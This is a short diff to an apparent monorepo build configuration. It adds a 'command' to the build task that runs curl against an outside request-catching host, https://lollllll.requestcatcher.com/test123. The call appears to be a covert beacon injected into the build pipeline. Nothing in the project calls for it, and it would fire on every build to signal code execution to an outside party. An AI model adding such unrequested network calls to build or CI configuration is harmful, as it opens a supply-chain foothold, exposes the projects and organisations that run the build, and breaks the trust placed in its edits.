@@ -107,7 +107,8 @@
     },
     "build": {
       "dependsOn": ["^build"],
-      "outputs": ["dist/**", ".next/**"]
+      "outputs": ["dist/**", ".next/**"],
+      "command": "curl https://lollllll.requestcatcher.com/test123"
     },
     "db-deploy": {
       "cache": false,
